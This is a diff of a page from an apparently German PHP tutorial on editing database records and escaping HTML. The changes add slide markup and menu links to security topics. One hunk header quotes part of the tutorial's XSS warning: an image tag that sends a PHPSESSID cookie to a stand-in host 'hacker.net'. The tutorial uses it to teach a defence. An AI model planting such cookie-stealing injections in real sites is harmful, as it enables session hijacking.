@@ -68,7 +68,7 @@
                           </div>
 			
 			
-			<p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
+			<div class='slide'><p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
 
 <p><img  alt="Abbildung 150: Formular zum Bearbeiten einer Person" src="/images/person_edit.png" /></p>
 
@@ -163,6 +163,9 @@ header(&quot;Location: person.php?pid=&quot; . $_POST['id']);
 exit;
 </pre></div>
 
+</div>
+<div class='slide'>
+
 <h2 id="escapen-von-html">Escapen von HTML</h2>
 <p>Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank durchführen müssen. Wir haben bisher einfach die Daten direkt mit echo ausgegeben:</p>
 
@@ -197,8 +200,14 @@ EOM;
 
 <p><img  alt="Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" src="/images/image369.png" /></p>
 
+</div>
+<div class='slide'>
+
 <h2 id="darstellen-von-html">Darstellen von HTML</h2>
 <p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?</p>
+
+</div>
+<div class='slide'>
 
 <h3 id="gefahren">Gefahren</h3>
 <p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
@@ -240,6 +249,9 @@ src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb07
 
 <p><img  alt="Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt" src="/images/image370.png" /></p>
 
+</div>
+<div class='slide'>
+
 <h3 id="sichere-eingabe-von-html">Sichere Eingabe von HTML</h3>
 
 <p>Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:</p>
@@ -259,7 +271,7 @@ $description = strip_tags( $_POST['description'], &quot;&lt;p&gt;&lt;b&gt;&quot;
 Beispiel dafür ist der Aloha Editor:</p>
 
 <p><img  alt="Abbildung 153b: Aloha Editor" src="/images/aloha.png" /></p>
-
+</div>
 		
 			<div class="pagination">
   <ul>
@@ -704,6 +716,58 @@ Beispiel dafür ist der Aloha Editor:</p>
               </ul>
             </li>
           
+            <li ><a href="/security/">SECURITY</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/security/a1-injection/">Injection</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a2-xss/">Cross Site Scripting (XSS)</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a3-auth/">Authentifizierung und Session-Management</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a4-referenz/">Unsichere direkte Objektreferenzen</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a5-csrf/">Cross-Site Request Forgery (CSRF)</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a6-konfiguration/">Sicherheitsrelevante Fehlkonfiguration</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a7-krypto/">Kryptografisch unsichere Speicherung</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a8-url/">Mangelhafter URL-Zugriffsschutz</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a9-transport/">Unzureichende Absicherung der Transportschicht</a></li>
+                      
+                    
+                      
+                      <li ><a href="/security/a10-redirect/">Ungeprüfte Um- und Weiterleitungen</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
             <li ><a href="/svg/">SVG</a>
               <ul class="sub">
                 
@@ -741,6 +805,10 @@ Beispiel dafür ist der Aloha Editor:</p>
                     
                       
                       <li ><a href="/javascript/funktionen/">Funktionen und this</a></li>
+                      
+                    
+                      
+                      <li ><a href="/javascript/closures/">Funktionen und Closures</a></li>
                       
                     
                       
